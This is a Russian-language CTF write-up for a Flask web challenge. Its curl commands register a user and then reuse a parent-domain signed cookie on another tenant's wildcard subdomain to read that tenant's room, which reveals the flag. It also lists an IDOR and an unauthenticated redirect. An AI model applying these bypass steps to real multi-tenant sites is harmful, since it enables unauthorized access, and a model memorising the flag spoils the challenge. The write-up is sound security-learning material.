# Writeup — Kommunalki (web)

**Флаг: `SOLARCTF{W1ldc4rd_DN3_R00m}`**

## Легенда
«Старые добрые коммуналки… бери ключ у управдома… все обо всех знает… в домовую книгу записывает» — подсказки: регистрация, общий ключ, доступ ко всем комнатам, «домовая книга» у управдома.

## Инфраструктура
- Цель: `http://188.243.222.16.nip.io:30101/` (Flask за waitress).
- Wildcard-DNS nip.io: `<tenant>.188.243.222.16.nip.io` → `188.243.222.16`; приложение выбирает «комнату» по поддомену (Host).
- Известные жильцы: `upravdom`, `baba-valya`, `sanych`, `tihonova`.

## Шаги воспроизведения
1. **Регистрация** (свой «ключ» делаем сами — заходи кто хочешь):
   ```
   curl --noproxy '*' -c jar.txt -X POST 'http://188.243.222.16.nip.io:30101/rent' \
        --data 'name=kvestolog&password=Parol123!'
   ```
   Готова комната `http://kvestolog.188.243.222.16.nip.io:30101/`.
2. **Вход в свою комнату:**
   ```
   curl --noproxy '*' -c jar.txt -X POST 'http://kvestolog.188.243.222.16.nip.io:30101/enter' \
        --data 'password=Parol123!'
   ```
   Ответ: `Set-Cookie: klyuch=eyJyIjoia3Zlc3RvbG9nIn0.…; Domain=188.243.222.16.nip.io; Max-Age=7200`.
   Полезная нагрузка cookie: `{"r":"kvestolog"}` (Flask/itsdangerous).
3. **Один ключ — все двери:** сервер на `GET /` проверяет только подпись cookie, но **не сверяет** `r` с арендатором из Host:
   ```
   curl --noproxy '*' -b jar.txt 'http://upravdom.188.243.222.16.nip.io:30101/'
   ```
   Отдаёт комнату upravdom как вошедшему.
4. **Флаг:** у `upravdom` вместо стены — «Домовая книга», запись 1:
   > Дом сдан. Квартирная мастерская выдала один ключ сразу на все двери — до конца ремонта.
   > Ключ: `SOLARCTF{W1ldc4rd_DN3_R00m}`

## Корень уязвимости
Классический misconfigured wildcard vhost: сессия «жильца» (`{"r":"<room>"}`) подписана сервером, но при рендере комнаты имя из Host подменяет проверку — сервер считает валидную подпись достаточной. Cookie при этом выдаётся на родительский домен, поэтому действует на всех поддоменах. Название флага (`W1ldc4rd…R00m`) прямо намекает на wildcard.

## Побочные находки (не нужны для флага)
- IDOR: `POST /note/delete` (`id` чужой записки) доступен из любой комнаты.
- `POST /goto` — 303 на поддомен без аутентификации и без cookie.

## Грабли
- Прокси из env (`127.0.0.1:10808`) ломает nip.io-поддомены → `curl --noproxy '*'`.
- Автоматический `curl -L` за 302: cookie ставится на поддомене — нужны `-c/-b` с одним jar.
